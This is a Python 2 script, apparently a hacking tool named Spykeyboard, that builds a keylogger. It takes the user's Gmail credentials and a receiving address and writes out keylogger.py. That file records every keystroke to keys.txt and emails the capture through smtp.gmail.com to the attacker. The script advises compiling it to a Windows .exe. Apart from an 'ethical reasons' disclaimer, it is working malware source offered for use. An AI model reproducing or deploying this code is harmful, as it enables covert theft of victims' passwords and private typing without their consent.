#!/bin/usr/python
# -*- coding: utf-8 -*-
import io
import os 
def generate(usuario,password,email1):
	with io.FileIO("keylogger.py", "w") as file:
		file.write('''
#!/bin/usr/python
# -*- coding: utf-8 -*-

import threading
import os
import keyboard
import smtplib
from time import sleep



 
def keylogger():

    FILE_NAME = "keys.txt"
    CLEAR_ON_STARTUP = False
    TERMINATE_KEY = "enter"

    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    output = open(FILE_NAME, "a")
    
    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
        output.write(string)
    
    output.close()

def sendmail():

     

   

    gmail_user = "'''+usuario+'''"
    gmail_password = "'''+password+'''"
    FROM =gmail_user
    TO = "'''+email1+'''"
    SUBJECT= "key" 

        
    sleep(7.0)
    try:
        F = open("keys.txt","r")

        TEXT= F.read()
        message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
        """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    except:
        print "error"

    try: 
        server =smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_password)
        server.sendmail(FROM, TO, message)
        server.close()
        print "eviado"
    except:
        print "error"


os.system("nano keys.txt")

while True:
 
    if __name__ == "__main__":
        
        key = threading.Thread(target=keylogger)
        mail = threading.Thread(target=sendmail)

 
        key.start()
        mail.start()
 
        key.join()
        mail.join()
 
''')

def info():

	print bcolors.BOLD+bcolors.RED+"\nThanks for trying my tool, do not forget to search me on my social networks"+bcolors.ENDC+bcolors.ENDC
	print "\033[1;36m● Twitter: @Sh4Rk_0\033[1;m"
	print bcolors.BLUE+"● Facebook: Hacking Pills"+bcolors.ENDC
	print bcolors.GREEN+"● Blog: hackingpills.blogspot.com"+bcolors.ENDC
	print bcolors.BOLD+bcolors.RED+"● YouTube: HackingPills\n"+bcolors.ENDC+bcolors.ENDC



class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'


print '''
 \033[1;91m
┌═════════════════════════════════════════════════════════════════════════════┐
█               Author: @Sh4Rk_0                                              █
█                                                                             █
█                       Site: https://hackingpills.blogspot.com               █
█                                                                             █ 
█                             Copyright (C) 2018 Spykeyboard @Sh4rk_0         █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m      


'''

print bcolors.BOLD+bcolors.RED+"\n●This tool was created for ethical reasons, I am not responsible for misuse.●"+bcolors.ENDC+bcolors.ENDC


usuario = raw_input(bcolors.GREEN+"Enter your email: "+bcolors.ENDC)

password = raw_input(bcolors.GREEN+"Enter your password: "+bcolors.ENDC)

email1 = raw_input(bcolors.GREEN+"Enter your email receive: "+bcolors.ENDC)

print bcolors.YELLOW+"\nYour keylogger is ready, compile it to .exe in a Windows machine."+bcolors.ENDC

generate(usuario,password,email1)
info()

